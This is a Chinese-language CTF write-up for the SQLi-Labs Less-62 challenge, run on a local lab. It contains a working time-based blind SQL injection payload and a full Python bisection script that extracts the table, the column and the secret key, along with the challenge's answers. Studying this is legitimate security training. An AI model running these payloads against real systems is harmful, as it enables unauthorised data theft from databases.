【SQLi-Labs】Less-62 Challenge-9 时间盲注自动化 Writeup

操作者：何芊宏 | 操作日期：2026.10.28 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 时间盲注, Python自动化, Challenge

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入 Challenge 系列
  • 题目名称：Less-62 (Challenge-9)
  • 提示：目标是从 challenges 库中提取密钥，限制 130 次尝试。无报错、无回显，闭合符为 ')。

2. 核心原理与前置分析

本关卡彻底关闭了数据回显与错误提示，属于纯粹的盲注环境。

技术选型：时间盲注（Time-based Blind SQLi）。利用 if(条件, sleep(2), 0) 制造响应时间差。为在 130 次限制内完成表名、列名及密钥的提取，采用 二分法（Bisection） 编写 Python 脚本进行自动化爆破。

3. 操作步骤与代码解析

第一步：手工验证延时通道

输入 URL：?id=1') and if(1=1,sleep(3),0)--+

回显现象：页面卡顿约 3 秒，证明时间盲注通道有效。

第二步：编写 Python 二分法自动化脚本

在 VS Code 中编写脚本，核心逻辑在于计算 HTTP 请求的耗时差，并设定较高的判断阈值以过滤网络抖动。

import requests
import time

url = "http://localhost/sqli-labs-master/Less-62/"
# 阈值设高一点（1.5秒），防止网络波动误判
delay_threshold = 1.5 

def check_true(payload):
    full_url = f"{url}?id=1') and ({payload})--+"
    try:
        start = time.time()
        requests.get(full_url, timeout=10)
        return (time.time() - start) > delay_threshold
    except requests.exceptions.Timeout:
        return True

def get_char(expr, pos):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        # 二分法核心：如果 ASCII 码大于中间值，就睡 2 秒
        payload = f"if(ascii(substr({expr},{pos},1))>{mid},sleep(2),0)"
        if check_true(payload):
            low = mid + 1
        else:
            high = mid - 1
    return low

def extract(expr, length):
    result = ""
    for i in range(1, length + 1):
        code = get_char(expr, i)
        if code <= 32 or code > 126:
            break
        result += chr(code)
        print(f"\r[*] 当前结果: {result}", end="", flush=True)
    print()
    return result

if __name__ == "__main__":
    print("[*] 开始 L62 时间盲注二分法提取...")
    table = extract("(select table_name from information_schema.tables where table_schema='challenges' limit 1)", 12)
    print(f"[+] 表名: {table}")
    
    col = extract("(select column_name from information_schema.columns where table_schema='challenges' and column_name like 'secret%' limit 1)", 16)
    print(f"[+] 列名: {col}")
    
    secret = extract(f"(select {col} from challenges.{table} limit 1)", 24)
    print(f"[+] 最终密钥: {secret}")

第三步：执行结果

终端成功输出：表名 3wgnd4kpm2，列名 secret_CTFP，最终密钥 npOJXohYGDdui9VFkoqw8SA。将其提交至页面底部输入框，通关成功。

4. 踩坑记录与复盘

  • 网络延迟导致的误判（秒数编码法失败）：最初尝试使用 sleep(ascii div 32) 的秒数编码法，但因本地网络延迟（如 0.6 秒）被 round() 函数误判为 1 秒，导致爆出 baiAdAsA 等乱码。时间盲注对网络环境极其敏感。
  • 二分法阈值优化：改用二分法，强制 sleep(2)，并将耗时阈值设为 1.5 秒。只要耗时超过 1.5 秒即判定为真，有效过滤了网络抖动的干扰。
  • 边界条件终止：在提取函数中加入 if code <= 32 or code > 126: break，防止因空字符无限循环，提高脚本健壮性。

5. 知识点总结

  • 时间盲注（Time-based Blind SQLi）：适用于无回显、无报错的环境。
  • 二分法（Bisection）：在盲注中通过不断折半缩小目标 ASCII 码的范围，极大提升效率。
  • 网络环境对盲注的影响：在网络延迟大的环境下，必须采用较高的延时阈值或更稳定的判断逻辑。
